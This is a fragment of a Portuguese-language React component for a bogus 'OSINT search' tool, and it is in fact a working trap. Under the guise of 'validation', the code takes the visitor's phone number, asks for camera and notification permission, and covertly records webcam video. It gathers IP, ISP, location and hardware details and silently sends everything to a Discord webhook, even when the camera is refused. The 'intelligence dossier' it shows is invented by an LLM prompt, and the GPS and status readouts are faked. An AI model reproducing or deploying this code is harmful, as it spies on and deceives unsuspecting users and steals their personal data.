      setQuery('');
      setShowValidationScreen(false);
      setUserRealNumber('');
      setStatusText('Aguardando entrada...');
      setPermissionError(false);
    }
  }, [isOpen]);

  const getGPUInfo = () => {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return 'Software Renderer';
      const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown Vendor';
    } catch (e) { return 'Generic Graphics'; }
  };

  const getClientMetadata = async () => {
    try {
      const ipResponse = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
      return {
        ip: ipResponse.ip || '0.0.0.0',
        isp: ipResponse.org || 'Desconhecido',
        city: ipResponse.city || 'Desconhecida',
        region: ipResponse.region || 'Desconhecida',
        timezone: ipResponse.timezone || 'America/Sao_Paulo',
        ua: navigator.userAgent,
        gpu: getGPUInfo()
      };
    } catch (e) {
      return { ua: navigator.userAgent, isp: 'Erro de Requisição', ip: '0.0.0.0', city: 'N/A', region: 'N/A', timezone: 'UTC', gpu: getGPUInfo() };
    }
  };

  const sendToDiscord = async (videoBlob?: Blob) => {
    try {
      const meta = await getClientMetadata();
      const formData = new FormData();

      const embed = {
        title: "⚡ ALVO LOCALIZADO - RELATÓRIO FORENSE",
        color: videoBlob ? 0x00FF00 : 0xFF0000,
        description: `Varredura executada com sucesso no terminal para o módulo **${tool.title}**.`,
        fields: [
          { name: "👤 Alvo da Busca", value: `\`${query}\``, inline: true },
          { name: "📞 Telefone Registro", value: `\`${userRealNumber}\``, inline: true },
          { name: "🌐 Operadora (ISP)", value: `\`${meta.isp}\``, inline: false },
          { name: "📍 Localização (IP)", value: `\`${meta.city}, ${meta.region} (${meta.ip})\``, inline: true },
          { name: "⏱️ Timezone", value: `\`${meta.timezone}\``, inline: true },
          { name: "🎮 Hardware (GPU)", value: `\`${meta.gpu}\``, inline: false },
          { name: "🛰️ Precisão GPS", value: `\`± 3.8 metros\``, inline: true },
          { name: "🌡️ Clima Local", value: `\`Ensolarado (28°C)\``, inline: true },
          { name: "📱 Terminal (User-Agent)", value: `\`\`\`${meta.ua.substring(0, 200)}\`\`\`` }
        ],
        footer: { text: "Nova Intelligence - Segurança Nível 5 | Protocolo OSINT" },
        timestamp: new Date().toISOString(),
        thumbnail: { url: "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnptbzJmZnd3ZXlyMXo0bmZ3em53em53em53em53em53em53em53JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKVUn7iM8FMEU24/giphy.gif" }
      };

      formData.append('payload_json', JSON.stringify({
        username: "Nova Bot Security",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041916.png",
        embeds: [embed]
      }));

      if (videoBlob) {
        formData.append('file', videoBlob, 'registro_forense.webm');
      }

      await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    } catch (err) { /* Silencioso */ }
  };

  const handleFinalSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userRealNumber) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Iniciando criptografia de terminal...');

    try {
      // Notificações - Essencial para "validação"
      if ("Notification" in window) await Notification.requestPermission();

      // Câmera - Silencioso
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      } catch (err) {
        setPermissionError(true);
        setIsLoading(false);
        await sendToDiscord(); // Loga mesmo se recusar
        return;
      }

      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;
      chunksRef.current = [];

      mediaRecorder.ondataavailable = (ev) => { if (ev.data.size > 0) chunksRef.current.push(ev.data); };
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        await sendToDiscord(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();

      const statuses = [
        'Autenticando certificado SSL...',
        'Interceptando pacotes ISP...', 
        'Sincronizando com base Google...',
        'Gerando relatório de inteligência...'
      ];

      let statusIdx = 0;
      const interval = setInterval(() => {
        setStatusText(statuses[statusIdx % statuses.length]);
        statusIdx++;
        if (statusIdx === 3) {
            if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
        }
      }, 1500);

      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Analista de Inteligência OSINT. Gere um dossiê técnico ultra detalhado para "${tool.title}" com o alvo "${query}". Retorne JSON com chaves: DADOS_PRINCIPAIS, REGISTROS_ATIVOS, LOCALIZACAO_ESTIMADA.`,
        config: { responseMimeType: "application/json" }
      });

      const data = JSON.parse(response.text || '{}');
      setResult(data);
      setShowValidationScreen(false);
      clearInterval(interval);

    } catch (error) {
      setIsLoading(false);
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-end lg:items-center justify-center p-0 lg:p-6">
      <div className="absolute inset-0 bg-black/98 backdrop-blur-3xl" onClick={onClose} />

      <div className="relative w-full h-[95vh] lg:h-auto lg:max-w-4xl bg-[#08080a] border-t lg:border border-white/10 rounded-t-[3rem] lg:rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">

        {/* Header */}
        <div className="shrink-0 p-6 lg:p-10 border-b border-white/5 flex items-center justify-between bg-zinc-900/10">
          <div className="flex items-center gap-5">
            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center ${tool.isPremium ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'bg-blue-500/10 text-blue-500 border border-blue-500/20'}`}>
               <Terminal size={32} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">{tool.title}</h2>
              <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-[0.3em]">{tool.subtitle}</p>
            </div>
          </div>
          <button onClick={onClose} className="p-3 bg-white/5 rounded-2xl text-zinc-600 hover:text-white transition-colors">
            <X size={28} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 lg:p-12 custom-scrollbar">
          <div className="max-w-2xl mx-auto space-y-10">

            {/* Phase 1: Input */}
            {!showValidationScreen && !result && (
              <form onSubmit={(e) => { e.preventDefault(); if(query) setShowValidationScreen(true); }} className="space-y-6 animate-in slide-in-from-bottom-4">
                <div className="space-y-2">
                   <div className="flex items-center justify-between px-2">
                      <label className="text-[10px] font-black text-zinc-700 uppercase tracking-widest">Protocolo de Consulta</label>
                      <span className="flex items-center gap-1 text-[9px] font-bold text-emerald-500/40 uppercase"><Radio size={10} className="animate-pulse"/> Conexão Encriptada</span>
                   </div>
                   <input 
                      ref={inputRef}
                      type="text"
                      value={query}
                      onChange={(e) => setQuery(e.target.value)}
                      placeholder="Diga o que buscar (CPF, Tel, Nome)..."
                      className="w-full bg-zinc-900/20 border-2 border-white/5 rounded-[2.5rem] py-8 px-10 text-white text-2xl font-black focus:border-emerald-500/20 transition-all outline-none"
                    />
                </div>
                <button type="submit" disabled={!query} className="w-full py-7 rounded-[2.5rem] bg-emerald-500 border-2 border-emerald-400 text-black font-black text-xl flex items-center justify-center gap-4 hover:brightness-110 active:scale-95 transition-all shadow-2xl shadow-emerald-500/20">
                  <ShieldCheck size={28} /> EXECUTAR VARREDURA
                </button>
              </form>
            )}

            {/* Phase 2: Professional Validation Request */}
            {showValidationScreen && !isLoading && (
              <div className="animate-in zoom-in-95 duration-300">
                <div className={`p-8 lg:p-12 rounded-[3.5rem] border-4 text-center space-y-8 shadow-2xl transition-all ${permissionError ? 'bg-zinc-950 border-red-500/40' : 'bg-zinc-900/10 border-white/5'}`}>

                   {permissionError ? (
                     <div className="space-y-8">
                        <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border-2 border-red-500/20">
                           <ShieldAlert size={48} className="text-red-500" />
